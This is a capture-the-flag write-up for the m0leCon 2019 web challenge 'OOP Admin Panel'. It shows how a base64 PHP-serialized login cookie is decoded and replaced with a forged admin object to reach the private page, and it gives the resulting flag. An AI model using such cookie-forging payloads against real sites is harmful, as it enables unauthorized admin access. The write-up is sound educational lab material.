# m0leCon CTF 2019 – OOP Admin Panel

* **Category:** web
* **Points:** 54

## Challenge

> This is my first website, can you prove it to be secure?
>
> Author: @andreossido
>
> http://10.255.0.1:8010/

## Solution

Connecting to the website you can see the following message.

```
Welcome

I'm admin of this site.
This is my first website... I think it's enough secure, but I didn't study sql yet.
Can you test it for me?
In private page there is a surprise for you!
```

Registering a user and analyzing the cookies will let you to discever the `login` cookie with a base64 content.

```
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjI7czo4OiJ1c2VybmFtZSI7czo1OiJhYWFhYSI7czo1OiJhZG1pbiI7YjowO30=
```

Decoding it will give you the following PHP serialized class.

```
O:4:"User":3:{s:2:"id";i:2;s:8:"username";s:5:"aaaaa";s:5:"admin";b:0;}
```

You can craft the following malicious serialized class to escalate privileges.

```
O:4:"User":3:{s:2:"id";i:1;s:8:"username";s:5:"admin";s:5:"admin";b:1;}
```

Then encode it in base64.

```
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo1OiJhZG1pbiI7YjoxO30
```

Changing the cookie with the encoded malicious payload and visiting the private section will give you the flag.

```
ptm{Cl455_S3r14l1z4t10n_15_B34ut1ful}
```